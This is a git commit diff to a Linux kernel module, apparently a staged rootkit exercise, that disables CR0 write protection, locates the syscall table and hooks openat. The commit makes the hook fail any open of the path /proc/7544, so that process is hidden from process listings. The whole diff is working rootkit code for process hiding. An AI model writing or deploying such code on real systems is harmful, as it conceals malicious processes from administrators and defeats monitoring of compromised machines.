d326af4793d71b873bb78884ffb5622a988eaf25
Yonatan Cohen <yonatanco404@gmail.com>
2025-01-24 12:16:57 +0200

    stage-4 working

--- stage4/PsIntercept.c
+++ stage4/PsIntercept.c
@@ -7,12 +7,15 @@
 #include <linux/limits.h>
 #include <stdbool.h>
 
+// Function prototypes
+void initialize_path_to_hide(void);
+
 // Types & other consts.
-# define PROC_SYS_TYPE 0x9fa0
 typedef int (*original_openat_t)(const struct pt_regs *regs);
 static original_openat_t original_openat_ptr;
 static unsigned long *syscall_table; 
-static char *file_name_to_hide = "14628";
+static char pid_to_hide[] = "7544";
+static char *path_to_hide;
  
 static inline void wp_cr0(unsigned long val) {
     __asm__ __volatile__ ("mov %0, %%cr0": "+r" (val));
@@ -32,14 +35,29 @@ int new_openat(const struct pt_regs *regs) {
     void *path_name_pointer = (void *)regs->si;
     char *path;
     path = kmalloc(PATH_MAX, GFP_KERNEL);
-
     copy_from_user((void *)path, path_name_pointer, PATH_MAX);
-    printk(KERN_ALERT "Path: %s", path);
+
+    // If the target is inside the path we're trying to hide, return an error.
+    if (strstr(path, path_to_hide) != NULL) {
+        return -1;
+    }
+
     return original_openat_ptr(regs);
 }
  
+void initialize_path_to_hide(void) {
+    char proc_path[] = "/proc/";
+
+    // + 1 for the null terminator at the end of the string.
+    int path_to_hide_len = strlen(pid_to_hide) + strlen(proc_path) + 1;
+    path_to_hide = kmalloc(path_to_hide_len, GFP_KERNEL);
+    sprintf(path_to_hide, "%s%s", proc_path, pid_to_hide);
+}
+
 int load(void) {
     printk(KERN_ALERT "Initializing...");
+    initialize_path_to_hide();
+
     zero_cr0();
     syscall_table = (unsigned long*)kallsyms_lookup_name("sys_call_table");
     original_openat_ptr = (original_openat_t)syscall_table[__NR_openat];
